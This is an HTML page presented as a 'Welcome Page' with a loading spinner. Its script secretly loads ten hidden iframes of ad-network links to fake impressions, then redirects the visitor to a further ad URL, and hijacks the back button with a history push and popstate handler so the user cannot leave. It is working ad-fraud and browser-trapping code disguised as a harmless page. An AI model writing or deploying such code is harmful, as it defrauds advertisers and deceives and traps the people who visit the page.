
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Welcome Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Optional: Update Open Graph meta tags -->
  <meta property="og:title" content="Welcome Page">
  <meta property="og:description" content="Click to continue.">
  <meta property="og:url" content="https://yourdomain.com/redirect">
  <meta property="og:image" content="https://yourdomain.com/default-preview.png">
  <meta property="og:type" content="website">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    .spinner {
      border: 8px solid #333;
      border-top: 8px solid #fff;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 18px;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <p>Loading... Please wait</p>

  <script>
    const adLinks = [
      "https://www.profitableratecpm.com/qfjm70vdi?key=ca96700e8ffdb71988d50fc574c134c4",
      "https://www.profitableratecpm.com/c0rzkaxg?key=60e9ffa06e385f944fedc960922f273c",
      "https://www.profitableratecpm.com/ptkfameg0?key=962252b65034826dde7da9f5cd593e47",
      "https://www.profitableratecpm.com/is95600r?key=b72de3e2bc634b426ffade5b44915672",
      "https://www.profitableratecpm.com/fjh55qwrj?key=a243e7179240725bc21cce30b6ab896b",
      "https://www.profitableratecpm.com/gahq32tnq?key=e39fefe7eca2bc7e49191d6a748bef4c",
      "https://www.profitableratecpm.com/c2bkz6dyj?key=2496fa2a27e182e54ff6f935629e5d0e",
      "https://www.profitableratecpm.com/ut2fj0ij5?key=431ac4487f149c133ed320ff8f11185e",
      "https://www.profitableratecpm.com/j1qprcy4h0?key=9a2bd14b70fd57891403ba33409fcda6",
      "https://www.profitableratecpm.com/ccm98d00?key=b23e3d90b06d73faca72bf713825801d"
    ];

    const redirectURL = "https://www.profitableratecpm.com/u9uinu2tx4?key=2bd27e9fb780cb9d5b7bbaa7d6e7e5bc";
    let index = 0;

    function fireImpression(link) {
      const iframe = document.createElement("iframe");
      iframe.src = link;
      iframe.style.display = "none";
      document.body.appendChild(iframe);
    }

    function loadAds() {
      if (index < adLinks.length) {
        fireImpression(adLinks[index]);
        index++;
        setTimeout(loadAds, 500);
      } else {
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 1000);
      }
    }

    history.pushState(null, "", location.href);
    window.addEventListener("popstate", function () {
      location.href = redirectURL;
    });

    window.onload = loadAds;
  </script>
</body>
</html>
